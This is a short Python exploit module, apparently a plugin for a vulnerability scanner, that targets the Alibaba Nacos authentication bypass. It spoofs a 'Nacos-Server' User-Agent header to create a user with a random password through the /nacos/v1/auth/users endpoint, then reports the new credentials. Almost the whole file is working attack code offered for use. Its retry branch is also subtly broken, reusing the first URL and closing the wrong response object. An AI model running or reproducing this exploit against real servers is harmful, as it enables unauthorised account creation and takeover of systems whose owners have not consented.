#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Alibaba Nacos 任意用户创建',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  ret = msg()
  headers = {
      "User-Agent": "Nacos-Server",
      "Content-Type": "application/x-www-form-urlencoded",
      }
  targets = ['/nacos/v1/auth/users','/v1/auth/users']
  # number = random.randint(0,999)
  username = randomLowercase(5)
  password = randomLowercase(10)
  data = f"username={username}&password={password}"
  url1 = url+targets[0]
  url2 = url+targets[1]
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "create user ok!" in res.text:
      ret['huixian'] = '创建用户成功，账号/密码：'+data
      ret['ifbug'] = True
      ret['url'] = url1
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if resp.status_code == 200 and "create user ok!" in resp.text:
      ret['huixian'] = '创建用户成功，账号/密码：'+data
      ret['url'] = url2
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret